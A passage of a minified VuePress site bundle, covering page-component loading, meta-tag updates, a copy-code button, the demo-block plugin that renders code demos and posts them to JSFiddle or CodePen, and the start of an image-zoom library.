:()=>t.e(284).then(t.bind(null,984)),"v-0d3097c3":()=>t.e(18).then(t.bind(null,985)),"v-61b941f4":()=>t.e(285).then(t.bind(null,986)),"v-3e68cfb4":()=>t.e(77).then(t.bind(null,987)),"v-0b475278":()=>t.e(56).then(t.bind(null,988)),"v-b5797aac":()=>t.e(78).then(t.bind(null,989)),"v-67a8e0e4":()=>t.e(109).then(t.bind(null,990)),"v-327e57e0":()=>t.e(43).then(t.bind(null,991)),"v-0a311fbb":()=>t.e(79).then(t.bind(null,992)),"v-1511a062":()=>t.e(110).then(t.bind(null,993)),"v-50e3afbe":()=>t.e(111).then(t.bind(null,994)),"v-c5579ed0":()=>t.e(286).then(t.bind(null,995)),"v-1f6eb0be":()=>t.e(112).then(t.bind(null,996)),"v-20b7b93b":()=>t.e(113).then(t.bind(null,997)),"v-08281882":()=>t.e(287).then(t.bind(null,998)),"v-b945b45c":()=>t.e(288).then(t.bind(null,999)),"v-5598df1b":()=>t.e(289).then(t.bind(null,1e3)),"v-52a39b45":()=>t.e(290).then(t.bind(null,1001)),"v-41a9b6a5":()=>t.e(291).then(t.bind(null,1002)),"v-d0167e76":()=>t.e(292).then(t.bind(null,1003)),"v-485a7d47":()=>t.e(57).then(t.bind(null,1004)),"v-36419016":()=>t.e(293).then(t.bind(null,1005)),"v-27a24cd8":()=>t.e(294).then(t.bind(null,1006)),"v-c4eaae76":()=>t.e(295).then(t.bind(null,1007)),"v-35ef0056":()=>t.e(296).then(t.bind(null,1008)),"v-7f55e15e":()=>t.e(297).then(t.bind(null,1009)),"v-3e5dc954":()=>t.e(103).then(t.bind(null,1010)),"v-3ef59e16":()=>t.e(171).then(t.bind(null,1011))};function Wo(n){const e=Object.create(null);return function(t){return e[t]||(e[t]=n(t))}}const Qo=/-(\w)/g,Zo=Wo(n=>n.replace(Qo,(n,e)=>e?e.toUpperCase():"")),Go=/\B([A-Z])/g,Ko=Wo(n=>n.replace(Go,"-$1").toLowerCase()),Xo=Wo(n=>n.charAt(0).toUpperCase()+n.slice(1));function Yo(n,e){if(!e)return;if(n(e))return n(e);return e.includes("-")?n(Xo(Zo(e))):n(Xo(e))||n(Ko(e))}const ns=Object.assign({},Vo,Jo),es=n=>ns[n],ts=n=>Jo[n],as=n=>Vo[n],rs=n=>Vt.component(n);function is(n){return Yo(ts,n)}function os(n){return Yo(as,n)}function ss(n){return Yo(es,n)}function ls(n){return Yo(rs,n)}function cs(...n){return Promise.all(n.filter(n=>n).map(async n=>{if(!ls(n)&&ss(n)){const e=await ss(n)();Vt.component(n,e.default)}}))}function ps(n,e){"undefined"!=typeof window&&window.__VUEPRESS__&&(window.__VUEPRESS__[n]=e)}var ds=t(91),us=t.n(ds),ms=t(92),hs=t.n(ms),gs={created(){if(this.siteMeta=this.$site.headTags.filter(([n])=>"meta"===n).map(([n,e])=>e),this.$ssrContext){const e=this.getMergedMetaTags();this.$ssrContext.title=this.$title,this.$ssrContext.lang=this.$lang,this.$ssrContext.pageMeta=(n=e)?n.map(n=>{let e="<meta";return Object.keys(n).forEach(t=>{e+=` ${t}="${hs()(n[t])}"`}),e+">"}).join("\n    "):"",this.$ssrContext.canonicalLink=bs(this.$canonicalUrl)}var n},mounted(){this.currentMetaTags=[...document.querySelectorAll("meta")],this.updateMeta(),this.updateCanonicalLink()},methods:{updateMeta(){document.title=this.$title,document.documentElement.lang=this.$lang;const n=this.getMergedMetaTags();this.currentMetaTags=vs(n,this.currentMetaTags)},getMergedMetaTags(){const n=this.$page.frontmatter.meta||[];return us()([{name:"description",content:this.$description}],n,this.siteMeta,ys)},updateCanonicalLink(){fs(),this.$canonicalUrl&&document.head.insertAdjacentHTML("beforeend",bs(this.$canonicalUrl))}},watch:{$page(){this.updateMeta(),this.updateCanonicalLink()}},beforeDestroy(){vs(null,this.currentMetaTags),fs()}};function fs(){const n=document.querySelector("link[rel='canonical']");n&&n.remove()}function bs(n=""){return n?`<link href="${n}" rel="canonical" />`:""}function vs(n,e){if(e&&[...e].filter(n=>n.parentNode===document.head).forEach(n=>document.head.removeChild(n)),n)return n.map(n=>{const e=document.createElement("meta");return Object.keys(n).forEach(t=>{e.setAttribute(t,n[t])}),document.head.appendChild(e),e})}function ys(n){for(const e of["name","property","itemprop"])if(n.hasOwnProperty(e))return n[e]+e;return JSON.stringify(n)}var Es=t(50),ks={mounted(){window.addEventListener("scroll",this.onScroll)},methods:{onScroll:t.n(Es)()((function(){this.setActiveHash()}),300),setActiveHash(){const n=[].slice.call(document.querySelectorAll(".sidebar-link")),e=[].slice.call(document.querySelectorAll(".header-anchor")).filter(e=>n.some(n=>n.hash===e.hash)),t=Math.max(window.pageYOffset,document.documentElement.scrollTop,document.body.scrollTop),a=Math.max(document.documentElement.scrollHeight,document.body.scrollHeight),r=window.innerHeight+t;for(let n=0;n<e.length;n++){const i=e[n],o=e[n+1],s=0===n&&0===t||t>=i.parentElement.offsetTop+10&&(!o||t<o.parentElement.offsetTop-10),l=decodeURIComponent(this.$route.hash);if(s&&l!==decodeURIComponent(i.hash)){const t=i;if(r===a)for(let t=n+1;t<e.length;t++)if(l===decodeURIComponent(e[t].hash))return;return this.$vuepress.$set("disableScrollBehavior",!0),void this.$router.replace(decodeURIComponent(t.hash),()=>{this.$nextTick(()=>{this.$vuepress.$set("disableScrollBehavior",!1)})})}}}},beforeDestroy(){window.removeEventListener("scroll",this.onScroll)}},xs=t(24),ws=t.n(xs),Bs={mounted(){ws.a.configure({showSpinner:!1}),this.$router.beforeEach((n,e,t)=>{n.path===e.path||Vt.component(n.name)||ws.a.start(),t()}),this.$router.afterEach(()=>{ws.a.done(),this.isSidebarOpen=!1})}};t(233),t(234);class As{constructor(){this.containerEl=document.getElementById("message-container"),this.containerEl||(this.containerEl=document.createElement("div"),this.containerEl.id="message-container",document.body.appendChild(this.containerEl))}show({text:n="",duration:e=3e3}){let t=document.createElement("div");t.className="message move-in",t.innerHTML=`\n      <i style="fill: #06a35a;font-size: 14px;display:inline-flex;align-items: center;">\n        <svg style="fill: #06a35a;font-size: 14px;" t="1572421810237" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2323" width="16" height="16"><path d="M822.811993 824.617989c-83.075838 81.99224-188.546032 124.613757-316.049383 127.86455-122.085362-3.250794-223.943563-45.87231-305.935802-127.86455s-124.613757-184.21164-127.86455-305.935802c3.250794-127.503351 45.87231-232.973545 127.86455-316.049383 81.99224-83.075838 184.21164-126.058554 305.935802-129.309347 127.503351 3.250794 232.973545 46.23351 316.049383 129.309347 83.075838 83.075838 126.058554 188.546032 129.309347 316.049383C949.231746 640.406349 905.887831 742.62575 822.811993 824.617989zM432.716755 684.111464c3.973192 3.973192 8.307584 5.779189 13.364374 6.140388 5.05679 0.361199 9.752381-1.444797 13.364374-5.417989l292.571429-287.514638c3.973192-3.973192 5.779189-8.307584 5.779189-13.364374 0-5.05679-1.805996-9.752381-5.779189-13.364374l1.805996 1.805996c-3.973192-3.973192-8.668783-5.779189-14.086772-6.140388-5.417989-0.361199-10.47478 1.444797-14.809171 5.417989l-264.397884 220.33157c-3.973192 3.250794-8.668783 4.695591-14.447972 4.695591-5.779189 0-10.835979-1.444797-15.53157-3.973192l-94.273016-72.962257c-4.334392-3.250794-9.391182-4.334392-14.447972-3.973192s-9.391182 3.250794-12.641975 7.585185l-2.889594 3.973192c-3.250794 4.334392-4.334392 9.391182-3.973192 14.809171 0.722399 5.417989 2.528395 10.11358 5.779189 14.086772L432.716755 684.111464z" p-id="2324"></path></svg>\n      </i>\n      <div class="text">${n}</div>\n    `,this.containerEl.appendChild(t),e>0&&setTimeout(()=>{this.close(t)},e)}close(n){n.className=n.className.replace("move-in",""),n.className+="move-out",n.addEventListener("animationend",()=>{n.remove()})}}var Cs={mounted(){!!/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)||this.updateCopy()},updated(){!!/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)||this.updateCopy()},methods:{updateCopy(){setTimeout(()=>{(['div[class*="language-"] pre','div[class*="aside-code"] aside']instanceof Array||Array.isArray(['div[class*="language-"] pre','div[class*="aside-code"] aside']))&&['div[class*="language-"] pre','div[class*="aside-code"] aside'].forEach(n=>{document.querySelectorAll(n).forEach(this.generateCopyButton)})},1e3)},generateCopyButton(n){if(n.classList.contains("codecopy-enabled"))return;const e=document.createElement("i");e.className="code-copy",e.innerHTML='<svg  style="color:#aaa;font-size:14px" t="1572422231464" class="icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="3201" width="14" height="14"><path d="M866.461538 39.384615H354.461538c-43.323077 0-78.769231 35.446154-78.76923 78.769231v39.384616h472.615384c43.323077 0 78.769231 35.446154 78.769231 78.76923v551.384616h39.384615c43.323077 0 78.769231-35.446154 78.769231-78.769231V118.153846c0-43.323077-35.446154-78.769231-78.769231-78.769231z m-118.153846 275.692308c0-43.323077-35.446154-78.769231-78.76923-78.769231H157.538462c-43.323077 0-78.769231 35.446154-78.769231 78.769231v590.769231c0 43.323077 35.446154 78.769231 78.769231 78.769231h512c43.323077 0 78.769231-35.446154 78.76923-78.769231V315.076923z m-354.461538 137.846154c0 11.815385-7.876923 19.692308-19.692308 19.692308h-157.538461c-11.815385 0-19.692308-7.876923-19.692308-19.692308v-39.384615c0-11.815385 7.876923-19.692308 19.692308-19.692308h157.538461c11.815385 0 19.692308 7.876923 19.692308 19.692308v39.384615z m157.538461 315.076923c0 11.815385-7.876923 19.692308-19.692307 19.692308H216.615385c-11.815385 0-19.692308-7.876923-19.692308-19.692308v-39.384615c0-11.815385 7.876923-19.692308 19.692308-19.692308h315.076923c11.815385 0 19.692308 7.876923 19.692307 19.692308v39.384615z m78.769231-157.538462c0 11.815385-7.876923 19.692308-19.692308 19.692308H216.615385c-11.815385 0-19.692308-7.876923-19.692308-19.692308v-39.384615c0-11.815385 7.876923-19.692308 19.692308-19.692308h393.846153c11.815385 0 19.692308 7.876923 19.692308 19.692308v39.384615z" p-id="3202"></path></svg>',e.title="Copy to clipboard",e.addEventListener("click",()=>{this.copyToClipboard(n.innerText)}),n.appendChild(e),n.classList.add("codecopy-enabled")},copyToClipboard(n){const e=document.createElement("textarea");e.value=n,e.setAttribute("readonly",""),e.style.position="absolute",e.style.left="-9999px",document.body.appendChild(e);const t=document.getSelection().rangeCount>0&&document.getSelection().getRangeAt(0);e.select(),document.execCommand("copy");(new As).show({text:"复制成功",duration:1e3}),document.body.removeChild(e),t&&(document.getSelection().removeAllRanges(),document.getSelection().addRange(t))}}};!function(n,e){void 0===e&&(e={});var t=e.insertAt;if(n&&"undefined"!=typeof document){var a=document.head||document.getElementsByTagName("head")[0],r=document.createElement("style");r.type="text/css","top"===t&&a.firstChild?a.insertBefore(r,a.firstChild):a.appendChild(r),r.styleSheet?r.styleSheet.cssText=n:r.appendChild(document.createTextNode(n))}}("@media (max-width: 1000px) {\n  .vuepress-plugin-demo-block__h_code {\n    display: none;\n  }\n  .vuepress-plugin-demo-block__app {\n    margin-left: auto !important;\n    margin-right: auto !important;\n  }\n}\n.vuepress-plugin-demo-block__wrapper {\n  margin-top: 10px;\n  border: 1px solid #ebebeb;\n  border-radius: 4px;\n  transition: all 0.2s;\n}\n.vuepress-plugin-demo-block__wrapper.vuepress-plugin-demo-block__horizontal .vuepress-plugin-demo-block__display {\n  height: 400px;\n  display: flex;\n}\n.vuepress-plugin-demo-block__wrapper.vuepress-plugin-demo-block__horizontal .vuepress-plugin-demo-block__display .vuepress-plugin-demo-block__app {\n  width: 300px;\n  border: 1px solid #ebebeb;\n  box-shadow: 1px 1px 3px #ebebeb;\n  margin-right: 5px;\n  overflow: auto;\n}\n.vuepress-plugin-demo-block__wrapper.vuepress-plugin-demo-block__horizontal .vuepress-plugin-demo-block__display .vuepress-plugin-demo-block__h_code {\n  flex: 1;\n  overflow: auto;\n  height: 100%;\n}\n.vuepress-plugin-demo-block__wrapper.vuepress-plugin-demo-block__horizontal .vuepress-plugin-demo-block__display .vuepress-plugin-demo-block__h_code > pre {\n  overflow: visible;\n}\n.vuepress-plugin-demo-block__wrapper .vuepress-plugin-demo-block__display {\n  max-height: 400px;\n  overflow: auto;\n}\n.vuepress-plugin-demo-block__wrapper div {\n  box-sizing: border-box;\n}\n.vuepress-plugin-demo-block__wrapper:hover {\n  box-shadow: 0 0 11px rgba(33, 33, 33, 0.2);\n}\n.vuepress-plugin-demo-block__wrapper .vuepress-plugin-demo-block__code {\n  overflow: hidden;\n  height: 0;\n  padding: 0 !important;\n  background-color: #282c34;\n  border-radius: 0 !important;\n  transition: height 0.5s;\n}\n.vuepress-plugin-demo-block__wrapper .vuepress-plugin-demo-block__code pre {\n  margin: 0 !important;\n}\n.vuepress-plugin-demo-block__wrapper .vuepress-plugin-demo-block__display {\n  padding: 20px;\n  border-bottom: 1px solid #ebebeb;\n}\n.vuepress-plugin-demo-block__wrapper .vuepress-plugin-demo-block__footer {\n  position: relative;\n  text-align: center;\n}\n.vuepress-plugin-demo-block__wrapper .vuepress-plugin-demo-block__footer.vuepress-plugin-demo-block__show-link .vuepress-plugin-demo-block__jsfiddle,\n.vuepress-plugin-demo-block__wrapper .vuepress-plugin-demo-block__footer.vuepress-plugin-demo-block__show-link .vuepress-plugin-demo-block__codepen {\n  opacity: 1;\n}\n.vuepress-plugin-demo-block__wrapper .vuepress-plugin-demo-block__footer.vuepress-plugin-demo-block__show-link .vuepress-plugin-demo-block__expand::before {\n  border-top: none;\n  border-right: 6px solid transparent;\n  border-bottom: 6px solid #ccc;\n  border-left: 6px solid transparent;\n}\n.vuepress-plugin-demo-block__wrapper .vuepress-plugin-demo-block__footer:hover .vuepress-plugin-demo-block__jsfiddle,\n.vuepress-plugin-demo-block__wrapper .vuepress-plugin-demo-block__footer:hover .vuepress-plugin-demo-block__codepen,\n.vuepress-plugin-demo-block__wrapper .vuepress-plugin-demo-block__footer:hover .vuepress-plugin-demo-block__expand span,\n.vuepress-plugin-demo-block__wrapper .vuepress-plugin-demo-block__footer:hover .vuepress-plugin-demo-block__expand {\n  opacity: 1;\n}\n.vuepress-plugin-demo-block__wrapper .vuepress-plugin-demo-block__footer:hover .vuepress-plugin-demo-block__expand::before {\n  border-top-color: #3eaf7c !important;\n  border-bottom-color: #3eaf7c !important;\n}\n.vuepress-plugin-demo-block__wrapper .vuepress-plugin-demo-block__footer:hover svg {\n  fill: #3eaf7c !important;\n}\n.vuepress-plugin-demo-block__wrapper .vuepress-plugin-demo-block__footer .vuepress-plugin-demo-block__expand-text {\n  transition: all 0.5s;\n  opacity: 0;\n}\n.vuepress-plugin-demo-block__wrapper .vuepress-plugin-demo-block__footer form:nth-last-child(2) {\n  right: 50px;\n}\n.vuepress-plugin-demo-block__wrapper .vuepress-plugin-demo-block__footer form:last-child {\n  right: 10px;\n}\n.vuepress-plugin-demo-block__wrapper .vuepress-plugin-demo-block__footer .vuepress-plugin-demo-block__button {\n  border-color: transparent;\n  background-color: transparent;\n  font-size: 14px;\n  color: #3eaf7c;\n  cursor: pointer;\n  outline: none;\n  margin: 0;\n  width: 46px;\n  position: relative;\n}\n.vuepress-plugin-demo-block__wrapper .vuepress-plugin-demo-block__footer .vuepress-plugin-demo-block__button:hover::before {\n  content: attr(data-tip);\n  white-space: nowrap;\n  position: absolute;\n  top: -30px;\n  left: 50%;\n  color: #eee;\n  line-height: 1;\n  z-index: 1000;\n  border-radius: 4px;\n  padding: 6px;\n  -webkit-transform: translateX(-50%);\n          transform: translateX(-50%);\n  background-color: rgba(0, 0, 0, 0.8);\n}\n.vuepress-plugin-demo-block__wrapper .vuepress-plugin-demo-block__footer .vuepress-plugin-demo-block__button:hover::after {\n  content: '' !important;\n  display: block;\n  position: absolute;\n  left: 50%;\n  top: -5px;\n  -webkit-transform: translateX(-50%);\n          transform: translateX(-50%);\n  border: 5px solid transparent;\n  border-top-color: rgba(0, 0, 0, 0.8);\n}\n.vuepress-plugin-demo-block__wrapper .vuepress-plugin-demo-block__footer .vuepress-plugin-demo-block__button svg {\n  width: 34px;\n  height: 20px;\n  fill: #ccc;\n}\n.vuepress-plugin-demo-block__wrapper .vuepress-plugin-demo-block__footer .vuepress-plugin-demo-block__jsfiddle,\n.vuepress-plugin-demo-block__wrapper .vuepress-plugin-demo-block__footer .vuepress-plugin-demo-block__codepen {\n  position: absolute;\n  top: 10px;\n  transition: all 0.5s;\n}\n.vuepress-plugin-demo-block__wrapper .vuepress-plugin-demo-block__footer .vuepress-plugin-demo-block__expand {\n  position: relative;\n  width: 100px;\n  height: 40px;\n  margin: 0;\n  color: #3eaf7c;\n  font-size: 14px;\n  background-color: transparent;\n  border-color: transparent;\n  outline: none;\n  transition: all 0.5s;\n  cursor: pointer;\n}\n.vuepress-plugin-demo-block__wrapper .vuepress-plugin-demo-block__footer .vuepress-plugin-demo-block__expand::before {\n  content: \"\";\n  position: absolute;\n  top: 50%;\n  left: 50%;\n  width: 0;\n  height: 0;\n  border-top: 6px solid #ccc;\n  border-right: 6px solid transparent;\n  border-left: 6px solid transparent;\n  -webkit-transform: translate(-50%, -50%);\n          transform: translate(-50%, -50%);\n}\n");var Ss={jsLib:[],cssLib:[],jsfiddle:!0,codepen:!0,codepenLayout:"left",codepenJsProcessor:"babel",codepenEditors:"101",horizontal:!1,vue:"https://cdn.jsdelivr.net/npm/vue/dist/vue.min.js",react:"https://cdn.jsdelivr.net/npm/react/umd/react.production.min.js",reactDOM:"https://cdn.jsdelivr.net/npm/react-dom/umd/react-dom.production.min.js"},js={},Ts=function(n){return'<div id="app">\n'.concat(n,"\n</div>")},Ps=function(n){return window.$VUEPRESS_DEMO_BLOCK&&void 0!==window.$VUEPRESS_DEMO_BLOCK[n]?window.$VUEPRESS_DEMO_BLOCK[n]:Ss[n]},_s=function n(e,t,a){var r=document.createElement(e);return t&&Object.keys(t).forEach((function(n){if(n.indexOf("data"))r[n]=t[n];else{var e=n.replace("data","");r.dataset[e]=t[n]}})),a&&a.forEach((function(e){var t=e.tag,a=e.attrs,i=e.children;r.appendChild(n(t,a,i))})),r},Is=function(n,e,t){var a,r=(a=n.querySelectorAll(".".concat(e)),Array.prototype.slice.call(a));return 1!==r.length||t?r:r[0]},zs=function(n,e){var t,a,r=n.match(/<style>([\s\S]+)<\/style>/),i=n.match(/<template>([\s\S]+)<\/template>/),o=n.match(/<script>([\s\S]+)<\/script>/),s={css:r&&r[1].replace(/^\n|\n$/g,""),html:i&&i[1].replace(/^\n|\n$/g,""),js:o&&o[1].replace(/^\n|\n$/g,""),jsLib:e.jsLib||[],cssLib:e.cssLib||[]};s.htmlTpl=Ts(s.html),s.jsTpl=(t=s.js,a=t.replace(/export\s+default\s*?\{\n*/,"").replace(/\n*\}\s*$/,"").trim(),"new Vue({\n  el: '#app',\n  ".concat(a,"\n})")),s.script=function(n,e){var t=n.split(/export\s+default/),a="(function() {".concat(t[0]," ; return ").concat(t[1],"})()"),r=window.Babel?window.Babel.transform(a,{presets:["es2015"]}).code:a,i=[eval][0](r);return i.template=e,i}(s.js,s.html);var l=Ps("vue");return s.jsLib.unshift(l),s},Ds=function(n,e){var t,a=n.match(/<style>([\s\S]+)<\/style>/),r=n.match(/<html>([\s\S]+)<\/html>/),i=n.match(/<script>([\s\S]+)<\/script>/),o={css:a&&a[1].replace(/^\n|\n$/g,""),html:r&&r[1].replace(/^\n|\n$/g,""),js:i&&i[1].replace(/^\n|\n$/g,""),jsLib:e.jsLib||[],cssLib:e.cssLib||[]};return o.htmlTpl=o.html,o.jsTpl=o.js,o.script=(t=o.js,window.Babel?window.Babel.transform(t,{presets:["es2015"]}).code:t),o},Ls=function(n){return n=n.replace("export default ","").replace(/App\.__style__(\s*)=(\s*)`([\s\S]*)?`/,""),n+='ReactDOM.render(React.createElement(App), document.getElementById("app"))'};function Os(){var n=Is(document,"vuepress-plugin-demo-block__wrapper",!0);n.length?n.forEach((function(n){if("true"!==n.dataset.created){n.style.display="block";var e=Is(n,"vuepress-plugin-demo-block__code"),t=Is(n,"vuepress-plugin-demo-block__display"),a=Is(n,"vuepress-plugin-demo-block__footer"),r=Is(t,"vuepress-plugin-demo-block__app"),i=decodeURIComponent(n.dataset.code),o=decodeURIComponent(n.dataset.config),s=decodeURIComponent(n.dataset.type);o=o?JSON.parse(o):{};var l=e.querySelector("div").clientHeight,c="react"===s?function(n,e){var t=(0,window.Babel.transform)(n,{presets:["es2015","react"]}).code,a="(function(exports){var module={};module.exports=exports;".concat(t,";return module.exports.__esModule?module.exports.default:module.exports;})({})"),r=new Function("return ".concat(a))(),i={js:r,css:r.__style__||"",jsLib:e.jsLib||[],cssLib:e.cssLib||[],jsTpl:Ls(n),htmlTpl:Ts("")},o=Ps("react"),s=Ps("reactDOM");return i.jsLib.unshift(o,s),i}(i,o):"vanilla"===s?Ds(i,o):zs(i,o),p=_s("button",{className:"".concat("vuepress-plugin-demo-block__expand")});if(a.appendChild(p),p.addEventListener("click",Fs.bind(null,p,l,e,a)),Ps("jsfiddle")&&a.appendChild(function(n){var e=n.css,t=n.htmlTpl,a=n.jsTpl,r=n.jsLib,i=n.cssLib,o=r.concat(i).concat(Ps("cssLib")).concat(Ps("jsLib")).join(",");return _s("form",{className:"vuepress-plugin-demo-block__jsfiddle",target:"_blank",action:"https://jsfiddle.net/api/post/library/pure/",method:"post"},[{tag:"input",attrs:{type:"hidden",name:"css",value:e}},{tag:"input",attrs:{type:"hidden",name:"html",value:t}},{tag:"input",attrs:{type:"hidden",name:"js",value:a}},{tag:"input",attrs:{type:"hidden",name:"panel_js",value:3}},{tag:"input",attrs:{type:"hidden",name:"wrap",value:1}},{tag:"input",attrs:{type:"hidden",name:"resources",value:o}},{tag:"button",attrs:{type:"submit",className:"vuepress-plugin-demo-block__button",innerHTML:'<?xml version="1.0" standalone="no"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg t="1547088289967" class="icon" style="" viewBox="0 0 1170 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1952" xmlns:xlink="http://www.w3.org/1999/xlink" width="228.515625" height="200"><defs><style type="text/css"></style></defs><path d="M1028.571429 441.142857q63.428571 26.285714 102.571428 83.142857T1170.285714 650.857143q0 93.714286-67.428571 160.285714T940 877.714286q-2.285714 0-6.571429-0.285715t-6-0.285714H232q-97.142857-5.714286-164.571429-71.714286T0 645.142857q0-62.857143 31.428571-116t84-84q-6.857143-22.285714-6.857142-46.857143 0-65.714286 46.857142-112t113.714286-46.285714q54.285714 0 98.285714 33.142857 42.857143-88 127.142858-141.714286t186.571428-53.714285q94.857143 0 174.857143 46T982.571429 248.571429t46.571428 172q0 3.428571-0.285714 10.285714t-0.285714 10.285714zM267.428571 593.142857q0 69.714286 48 110.285714t118.857143 40.571429q78.285714 0 137.142857-56.571429-9.142857-11.428571-27.142857-32.285714T519.428571 626.285714q-38.285714 37.142857-82.285714 37.142857-31.428571 0-53.428571-19.142857T361.714286 594.285714q0-30.285714 22-49.714285t52.285714-19.428572q25.142857 0 48.285714 12t41.714286 31.428572 37.142857 42.857142 39.428572 46.857143 44 42.857143 55.428571 31.428572 69.428571 12q69.142857 0 116.857143-40.857143T936 594.857143q0-69.142857-48-109.714286t-118.285714-40.571428q-81.714286 0-137.714286 55.428571l53.142857 61.714286q37.714286-36.571429 81.142857-36.571429 29.714286 0 52.571429 18.857143t22.857143 48q0 32.571429-21.142857 52.285714t-53.714286 19.714286q-24.571429 0-47.142857-12t-41.142857-31.428571-37.428572-42.857143-39.714286-46.857143-44.285714-42.857143-55.142857-31.428571T434.285714 444.571429q-69.714286 0-118.285714 40.285714T267.428571 593.142857z" p-id="1953"></path></svg>',datatip:"JSFiddle"}}])}(c)),Ps("codepen")&&a.appendChild(function(n){var e=n.css,t=n.htmlTpl,a=n.jsTpl,r=n.jsLib,i=n.cssLib,o=JSON.stringify({css:e,html:t,js:a,js_external:r.concat(Ps("jsLib")).join(";"),css_external:i.concat(Ps("cssLib")).join(";"),layout:Ps("codepenLayout"),js_pre_processor:Ps("codepenJsProcessor"),editors:Ps("codepenEditors")});return _s("form",{className:"vuepress-plugin-demo-block__codepen",target:"_blank",action:"https://codepen.io/pen/define",method:"post"},[{tag:"input",attrs:{type:"hidden",name:"data",value:o}},{tag:"button",attrs:{type:"submit",innerHTML:'<?xml version="1.0" standalone="no"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg t="1547088271207" class="icon" style="" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1737" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200"><defs><style type="text/css"></style></defs><path d="M123.428571 668l344.571429 229.714286v-205.142857L277.142857 565.142857z m-35.428571-82.285714l110.285714-73.714286-110.285714-73.714286v147.428572z m468 312l344.571429-229.714286-153.714286-102.857143-190.857143 127.428572v205.142857z m-44-281.714286l155.428571-104-155.428571-104-155.428571 104zM277.142857 458.857143l190.857143-127.428572V126.285714L123.428571 356z m548.571429 53.142857l110.285714 73.714286V438.285714z m-78.857143-53.142857l153.714286-102.857143-344.571429-229.714286v205.142857z m277.142857-102.857143v312q0 23.428571-19.428571 36.571429l-468 312q-12 7.428571-24.571429 7.428571t-24.571429-7.428571L19.428571 704.571429q-19.428571-13.142857-19.428571-36.571429V356q0-23.428571 19.428571-36.571429L487.428571 7.428571q12-7.428571 24.571429-7.428571t24.571429 7.428571l468 312q19.428571 13.142857 19.428571 36.571429z" p-id="1738"></path></svg>',className:"vuepress-plugin-demo-block__button",datatip:"Codepen"}}])}(c)),void 0!==o.horizontal?o.horizontal:Ps("horizontal")){n.classList.add("vuepress-plugin-demo-block__horizontal");var d=e.firstChild.cloneNode(!0);d.classList.add("vuepress-plugin-demo-block__h_code"),t.appendChild(d)}if(c.css&&function(n){if(!js[n]){var e=_s("style",{innerHTML:n});document.body.appendChild(e),js[n]=!0}}(c.css),"react"===s)ReactDOM.render(React.createElement(c.js),r);else if("vue"===s){var u=(new(Vue.extend(c.script))).$mount();r.appendChild(u.$el)}else"vanilla"===s&&(r.innerHTML=c.html,new Function("return (function(){".concat(c.script,"})()"))());n.dataset.created="true"}})):setTimeout((function(n){Os()}),300)}function Fs(n,e,t,a){var r="1"!==n.dataset.isExpand;t.style.height=r?"".concat(e,"px"):0,r?a.classList.add("vuepress-plugin-demo-block__show-link"):a.classList.remove("vuepress-plugin-demo-block__show-link"),n.dataset.isExpand=r?"1":"0"}var Ms={mounted:function(){window.$VUEPRESS_DEMO_BLOCK={jsfiddle:!1,codepen:!0,horizontal:!1},Os()},updated:function(){Os()}},Rs="auto",Us="zoom-in",qs="zoom-out",Ns="grab",$s="move";function Hs(n,e,t){var a=!(arguments.length>3&&void 0!==arguments[3])||arguments[3],r={passive:!1};a?n.addEventListener(e,t,r):n.removeEventListener(e,t,r)}function Vs(n,e){if(n){var t=new Image;t.onload=function(){e&&e(t)},t.src=n}}function Js(n){return n.dataset.original?n.dataset.original:"A"===n.parentNode.tagName?n.parentNode.getAttribute("href"):null}function Ws(n,e,t){!function(n){var e=Qs,t=Zs;if(n.transition){var a=n.transition;delete n.transition,n[e]=a}if(n.transform){var r=n.transform;delete n.transform,n[t]=r}}(e);var a=n.style,r={};for(var i in e)t&&(r[i]=a[i]||""),a[i]=e[i];return r}var Qs="transition",Zs="transform",Gs="transform",Ks="transitionend";var Xs=function(){},Ys={enableGrab:!0,preloadImage:!1,closeOnWindowResize:!0,transitionDuration:.4,transitionTimingFunction:"cubic-bezier(0.4, 0, 0, 1)",bgColor:"rgb(255, 255, 255)",bgOpacity:1,scaleBase:1,scaleExtra:.5,scrollThreshold:40,zIndex:998,customSize:null,onOpen:Xs,onClose:Xs,onGrab:Xs,onMove:Xs,onRelease:Xs,onBeforeOpen:Xs,onBeforeClose:Xs,onBeforeGrab:Xs,onBeforeRelease:Xs,onImageLoading:Xs,onImageLoaded:Xs},nl={init:function(n){var e,t;e=this,t=n,Object.getOwnPropertyNames(Object.getPrototypeOf(e)).forEach((function(n){e[n]=e[n].bind(t)}))},click:function(n){if(n.preventDefault(),tl(n))return window.open(this.target.srcOriginal||n.currentTarget.src,"_blank");this.shown?this.released?this.close():this.release():this.open(n.currentTarget)},scroll:function(){var n=document.documentElement||document.body.parentNode||document.body,e=window.pageXOffset||n.scrollLeft,t=window.pageYOffset||n.scrollTop;null===this.lastScrollPosition&&(this.lastScrollPosition={x:e,y:t});var a=this.lastScrollPosition.x-e,r=this.lastScrollPosition.y-t,i=this.options.scrollThreshold;(Math.abs(r)>=i||Math.abs(a)>=i)&&(this.lastScrollPosition=null,this.close())},keydown:function(n){(function(n){return"Escape"===(n.key||n.code)||27===n.keyCode})(n)&&(this.released?this.close():this.release(this.close))},mousedown:function(n){if(el(n)&&!tl(n)){n.preventDefault();var e=n.clientX,t=n.clientY;this.pressTimer=setTimeout(function(){this.grab(e,t)}.bind(this),200)}},mousemove:function(n){this.released||this.move(n.clientX,n.clientY)},mouseup:function(n){el(n)&&!tl(n)&&(clearTimeout(this.pressTimer),this.released?this.close():this.release())},touchstart:function(n){n.preventDefault();var e=n.touches[0],t=e.clientX,a=e.clientY;this.pressTimer=setTimeout(function(){this.grab(t,a)}.bind(this),200)},touchmove:function(n){if(!this.released){var 